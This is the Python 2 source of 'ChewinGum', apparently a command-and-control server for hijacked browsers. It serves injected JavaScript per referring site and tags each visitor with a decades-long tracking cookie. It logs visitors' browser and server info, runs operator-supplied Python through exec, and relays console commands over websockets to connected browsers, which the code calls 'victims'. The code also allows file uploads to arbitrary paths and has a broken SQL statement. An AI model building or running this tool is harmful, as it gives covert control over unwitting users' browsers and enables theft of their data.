#! /usr/bin/env python
# encoding=utf-8

#from __future__ import unicode_literals

import sqlite3
from sys import argv
from cgi import escape
from hashlib import md5
#from os.path import isfile
#from os import listdir, remove
from data.libdbs import sqlitei
from time import time, ctime, strftime, localtime
from bottle.ext.websocket import websocket, GeventWebSocketServer
#from beaker.middleware import SessionMiddleware as sessionm
from httplib import HTTPConnection as httpconn
from geventwebsocket import WebSocketError
from base64 import b64encode, b64decode
from urlparse import urlparse
from json import dumps, loads
from random import random
from bottle import run, error, get, post,\
	static_file, request, template, BaseRequest,\
	response, redirect, abort, app

BaseRequest.MEMFILE_MAX = 1024 * 1024

#Sqlite Sqldb
auser = sqlite3.connect('./data/auser.db')
ausers = auser.cursor()
gum = sqlitei('./data/gum.db')

ausers.execute("select salt from user where id=1")
salt = ausers.fetchone()[-1]
'''
#Session (bottle.ext.session
session_opt = {
    'session.type':'file',
    'session.cookie_expires':300,
    'session.data_dir':'./data/session',
    'session.auto':True
}
apps = sessionm(app(), session_opt)
'''
def getmd5(key):
    hashs = md5()
    hashs.update(key)
    return hashs.hexdigest()

def getoken():
    token = getmd5(str(random()) + str(salt))
    response.set_cookie('token', token, path='/home')
    return token

def setheader():
    response.set_header('X-Frame-Options', 'deny')

def validate(types):
    if types == 'login':
        login_key = request.get_cookie('key')
        if login_key:
            ausers.execute("select cookie from user where id=1")
            if login_key in ausers.fetchone():
                setheader()
                return False
    elif types == 'token':
        ctoken = request.get_cookie('token')
        ptoken = request.forms.token
        if ctoken and ptoken and ctoken == ptoken:
            return False
    return True

def b64ens(u):
    try:
        return b64encode(u)
    except UnicodeEncodeError:
        return b64encode(u.encode('utf8'))
    except TypeError:
        return b64encode(unicode(u))

@get('/static/<filename:path>')
@post('/static/<filename:path>')
def send_static(filename):
    return static_file(filename, root = './static/')

@error(404)
@error(405)
@error(500)
def errors(gumerror):
#    setheader()
    return template('errors',
            error = gumerror.status[:3],
            ctime = ctime())

@get('/')
@post('/')
def gumjs():
    projects = None
    domain = request.headers.get('Host')
    response.set_header('Content-Type', 'application/javascript')
    referer = request.headers.get('Referer')
    idsalt = request.get_cookie('gum')
    if idsalt:
        gum.select('object', ['upkey','browser'], {'idsalt':idsalt})
        objects = gum.cs.fetchone()
        if objects:
            return template('index',
                    domain = domain,
                    script = objects[1])
    if referer:
        gum.select('project', ['upkey','browser'], {'referer':referer})
        projects = gum.cs.fetchone()
        if not projects:
            gum.select('project', ['upkey','browser'],
                    {'referer':urlparse(referer).netloc})
            projects = gum.cs.fetchone()
    if not projects:
        gum.select('project', ['browser'], {'referer':'$default'})
        projects = gum.cs.fetchone()
    return template('index',
            domain = domain,
            script = projects[-1] if projects[-1] else '')

@get('/login')
@get('/home/rekey')
def rekey():
    if validate('login'):
        return template('login', uri='/login')
    return template('login', uri='/home/rekey', token=getoken())

@post('/login')
@post('/home/rekey')
def login_rekey():
    rekey = None
    referer = unicode(request.headers.get('Referer'))
    if urlparse(referer).path == '/home/rekey':
        if not validate('login'):
            if validate('token'):
                abort(404)
            rekey = True
        else:
            abort(404)
    filekey = request.files.get('filekey')
    urlkey = request.forms.urlkey
    if filekey:
        key = filekey.file.read()
    elif urlkey:
        itime = strftime('%y%m%d%H', localtime(time()))
        ttime = ausers.execute('select key from user where id=2').fetchone()
        if ttime and itime in ttime:
            ausers.execute('updata user set key=? where id=2',
                    [itime])
            auser.commit()
            redirect(referer)
        try:
            keyurl = urlparse(urlkey)
            httpkey = httpconn(keyurl.netloc)
            httpkey.request('GET', keyurl.path)
            key = httpkey.getresponse().read()
        except Exception as e:
            print unicode(e)
            redirect(referer)
    else:
        redirect(referer)
    ausers.execute("select key from user where id=1")
    keys = getmd5(b64encode(key) + salt)
    akeys = ausers.fetchone()[0]
    if keys != akeys:
        if rekey:
            ausers.execute("update user set key=? where id=1",
                    [keys])
        else:
            redirect(referer)
    else:
        ausers.execute("select id,salt,key,cookie from user where id=1")
        keyhash = getmd5(b64ens(ausers.fetchone()) + unicode(random()))
        ausers.execute("update user set cookie=? where id=1", [keyhash])
        response.set_cookie('key', keyhash, httponly = True,
                max_age = 604800, path = '/home')
    auser.commit()
    redirect('/home')

@post('/home/logout')
def logout():
    if validate('login') or validate('token'):
        abort(404)
    ausers.execute("update user set cookie=? where id=1",
            [None])
    auser.commit()
    redirect('/login')

@get('/home')
def home():
    if validate('login'):
        abort(404)
    gum.select('project', ['id','referer','upkey'])
    projects = gum.cs.fetchall()
    gum.select('object', ['idsalt','name','upkey'])
    objects = gum.cs.fetchall()
    gum.select('project', ['id'], {'upkey':'yes'})
    newid = gum.cs.fetchone()[0]
    return template('home',
            title='Home',
            new = newid,
            projects = projects, objects = objects,
            token = getoken())

@post('/home/<ids:int>/setting')
def set_project(ids):
    upkey = gum.select('project', ['upkey'], {'id':ids}).fetchone()
    if validate('login') or validate('token') or not upkey:
        abort(404)
    referer = request.forms.name
    if not referer:
        return 0
    setserver = unicode(request.forms.server)
    setbrowser = unicode(request.forms.browser)
    gum.update('project', {
        'upkey':'no',
        'referer':referer,
        'server':setserver,
        'browser':setbrowser
        }, {'id':ids})
    if upkey[0] == 'yes':
       gum.insert('project', ['upkey'], ['yes'])
    gum.commit()
    redirect(request.headers.get('Referer'))

@get('/home/project/<ids:int>')
def edit_project(ids):
    if validate('login'):
        abort(404)
    projects = gum.select('project', ['*'], {'id':ids}).fetchone()
    if not projects:
        abort(404)
    return template('setting.tpl',
            id = ids,
            title='Project',
            name = projects[2] if projects[2] else '',
            server = projects[4] if projects[4] else '',
            browser = projects[3] if projects[3] else '',
            idsalt = ids,
            token = getoken())

@get('/home/object/<idsalt:re:[a-z0-9]+>')
def edit_object(idsalt):
    if validate('login'):
        abort(404)
    objects = gum.select('object', [
        'upkey', 'name', 'browser', 'server', 'life'
        ], {'idsalt':idsalt}).fetchone()
    if not objects or objects[0] == 'yes':
        abort(404)
    infos = gum.select('info', ['id'], {'idsalt':idsalt}).fetchall()
    return template('setting.tpl',
            id = objects[1],
            title='Object',
            name = objects[1],
            browser = objects[2] if objects[2] else '',
            server = objects[3] if objects[3] else '',
            life = objects[4] if objects[4] else 'unknown',
            idsalt = idsalt, infos = infos,
            token = getoken())

@post('/home/<idsalt:re:[a-z0-9]+>/useing')
def set_object(idsalt):
    upkey = gum.select('object', ['upkey'], {'idsalt':idsalt}).fetchone()[0]
    if validate('login') or validate('token')\
            or not upkey or upkey == 'yes':
        abort(404)
    name = request.forms.name
    if not name:
        return False
    server = request.forms.server
    browser = request.forms.browser
    gum.update('object', {
        'name':name,
        'browser':browser,
        'server':server
        },{'idsalt':idsalt})
    gum.commit()
    redirect(request.headers.get('Referer'))

@get('/home/<ids:int>/info')
def seeinfo(ids):
    upkey = gum.select('info', ['upkey'], {'id':ids}).fetchone()[0]
    if validate('login') or not upkey or upkey == 'yes':
        abort(404)
    infos = gum.select('info', [
        'idsalt', 'serverinfo', 'browserinfo'
        ], {'id':ids}).fetchone()
    return template('seeinfo',
            idsalt = infos[0],
            title='Seeinfo',
            serverinfo = loads(infos[1]),
            browserinfo = loads(infos[2]),
            ids = ids,
            token = getoken())

@post('/home/delete/<state:re:Object>/<ids:re:[a-z0-9]+>')
@post('/home/delete/<state:re:Project>/<ids:int>')
@post('/home/delete/<state:re:Seeinfo>/<ids:int>')
def deletes(state, ids):
    if validate('login') or validate('token'):
        abort(404)
    state = 'info' if state == 'Seeinfo' else state.lower()
    idname = 'idsalt' if (state == 'object') else 'id'
    upkey = gum.select(state, ['upkey'], {idname:ids}).fetchone()
    if upkey and upkey != 'yes':
        if state == 'project' and ids == 1:
            redirect('/home')
        gum.delete(state, {idname:ids})
        gum.commit()
    redirect('/home')

@get('/home/plus')
def list_plus():
    if validate('login'):
        abort(404)
    return template('plus',
            token=getoken(),
            title='Plugins')
#    dirpath = request.query.ls if request.query.ls else './static/'
#    template('plus',lsdir = listdir(dirpath))

@post('/home/plus/up')
def plus_up():
    if validate('login') or validate('token'):
        abort(404)
    upload = request.files.get('plus')
    upload.save(request.forms.path + upload.filename)
    redirect('/home/plus')

@get('/ing')
@post('/ing')
def ing():
    projects = server = updates = None
    serverinfo = {}
    browserinfo = {}
    ifstatus = returns = ''
    idsalt = request.get_cookie('gum')
    referer = request.headers.get('Referer')
#    sessionid = request.environ.get('beaker.session')
    if idsalt:
        gum.select('object', ['upkey','server'], {'idsalt':idsalt})
        server = gum.cs.fetchone()
        server = (server[1] if server[1] else '') if server else ''
    if server == None:
        if referer:
            projects = gum.select('project', [
                'upkey', 'id', 'server', 'browser'
                ], {'referer':referer}).fetchone()
        if referer and not projects:
            projects = gum.select('project', [
                'upkey', 'id', 'server', 'browser'
                ], {'referer':urlparse(referer).netloc}).fetchone()
        if not referer or not projects:
            projects = gum.select('project', [
                'upkey', 'id', 'server', 'browser'
                ], {'id':1}).fetchone()
        server = setserver = projects[2] if projects[2] else ''
        setbrowser = projects[3] if projects[3] else ''
        setname = str(referer) + '_' + ctime() + '_' + str(projects[1])
        idsalt =  getmd5(str(setname) + str(salt))
        response.set_cookie('gum', idsalt,
                httponly = True, max_age = 946080000)
        gum.update('object', {
            'idsalt':idsalt,
            'name':setname,
            'browser':setbrowser,
            'server':setserver,
            'upkey':'no'
            }, {'upkey':'yes'})
        gum.insert('object', ['upkey'], ['yes'])
#    updates = True if sessionid.get(referer) else False
    if server:
        try:
            exec server
        except Exception as e:
            print 'ConfigError: server code error.'
            print unicode(e)
            serverinfo['SERVER_CODE_ERROR'] = b64ens(e)
    if not updates:
#        infoid = gums.execute("select id from info where upkey=?",
#                ['yes']).fetchone()[0]
        gum.update('info', {
            'upkey':'no',
            'idsalt':idsalt,
            'serverinfo':dumps(serverinfo),
            'browserinfo':dumps(browserinfo),
            }, {'upkey':'yes'})
        gum.insert('info', ['upkey'], ['yes'])
#        sessionid[referer] = [infoid, browserinfo]
#    else:
#        gums.execute("update info set browserinfo=? where id=?",
#		[dumps(browserinfo), sessionid.get(referer)[0]])
    gum.update('object', {'life':ctime()}, {'idsalt':idsalt})
#    sessionid.save()
    gum.commit()
    if ifstatus:
        abort(ifstatus, returns)
    return returns

consoles = {}
victims = {}
@get('/connect', apply=[websocket])
@get('/home/connect', apply=[websocket])
def cconnect(ws):
    if not validate('login'):
        lineor = True
        idsalt = request.query.idsalt
    else:
        lineor = False
        idsalt = request.get_cookie('gum')
    idsalt = idsalt if idsalt else ''
    upkey = gum.select('object', ['upkey'], {'idsalt':idsalt}).fetchone()
    if not idsalt or not upkey or upkey[0] == 'yes':
        abort(404)
    if lineor:
        consoles[idsalt] = ws
    else:
        if not idsalt in victims:
            victims[idsalt] = [ws]
        else:
            victims[idsalt].append(ws)
#        gum.update('object', {'life':ctime()}, {'idsalt':idsalt})
#        gum.commit()
    while True:
        try:
            cmdinfo = ws.receive().decode('utf8')
        except Exception as e:
            print e
            break
        if cmdinfo is not None:
            try:
                if lineor:
                    for v in victims[idsalt]:
                        v.send(cmdinfo)
                else:
                    u = unicode(ws)[-10:]
                    consoles[idsalt].send(u + escape(cmdinfo))
            except KeyError as e:
                consoles[idsalt].send(
                    escape('No User, {error}'.format(error=e)))
            except WebSocketError as e:
                consoles[idsalt].send(
                    escape(u + ' {error}'.format(error=e)))
        else: break
    ws.close()
#    if lineor:
#        del consoles[idsalt]
#    else:
#        del victims[idsalt]

@get('/home/console')
def console():
    domain = request.headers.get('Host')
    return template('console',
            domain=domain,
            token=getoken(),
            title='Console')

def main(host, port, debug):
#    run(host=host, port=port, debug=debug)#, app=apps)
    run(host=host, port=port, debug=debug, server=GeventWebSocketServer)

if __name__ == '__main__':
    if len(argv) <= 1 or ('-h' in argv) or ('--help' in argv):
        print b64decode(b64encode('ChewinGum'))
        print '''
usage:
	python ./chewingum.py [ host port debug | -h ]

	-h --help
'''
    else:
        host = (argv[1] if argv[1] else '0.0.0.0') if len(argv) > 1 else '0.0.0.0'
        port = (argv[2] if argv[2] else '80') if len(argv) > 2 else '80'
        debug = (True) if len(argv) > 3 else False
        main(host, port, debug)

application = app()
